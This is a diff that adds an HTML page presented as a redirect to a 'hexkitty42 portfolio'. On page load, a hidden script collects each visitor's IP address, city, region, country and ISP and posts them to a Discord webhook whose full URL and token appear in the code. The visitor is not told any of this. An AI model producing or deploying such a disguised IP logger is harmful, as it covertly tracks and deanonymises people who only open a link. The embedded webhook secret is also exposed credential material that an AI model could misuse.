@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>hexkitty42 portfolio</title>
+    <script>
+        // Function to send details to the webhook
+        async function sendDetailsToWebhook(details) {
+            const webhookURL = "https://discord.com/api/webhooks/1314790019466268733/hcQsSCjgAjsgzITPzQ7s157eRck6KeHQ25JT4xRdrQWOwVRcmhEJ2Ece9fIkPdtInZtX"; // Replace with your webhook URL
+
+            // Construct the payload
+            const payload = {
+                content: `Visitor Details:\n\n- IP Address: ${details.ip}\n- Country: ${details.country}\n- City: ${details.city}\n- Region: ${details.region}\n- ISP: ${details.org}`
+            };
+
+            try {
+                // Send the details to the webhook
+                await fetch(webhookURL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(payload)
+                });
+                console.log("Details sent to the webhook successfully.");
+            } catch (error) {
+                console.error("Error sending details to webhook:", error);
+            }
+        }
+
+        // Function to fetch IP and location details
+        async function fetchDetails() {
+            try {
+                // Fetch the details from the API
+                const response = await fetch("https://ipwhois.app/json/");
+                const details = await response.json();
+
+                // Send the details to the webhook
+                await sendDetailsToWebhook(details);
+            } catch (error) {
+                console.error("Error fetching details:", error);
+            }
+        }
+
+        // Fetch and send details when the page loads
+        window.onload = fetchDetails;
+    </script>
+</head>
+<body>
+    <h1>Redirecting you to the portfolio...</h1>
+    <!-- No more elements displaying IP details on the page -->
+</body>
+</html>
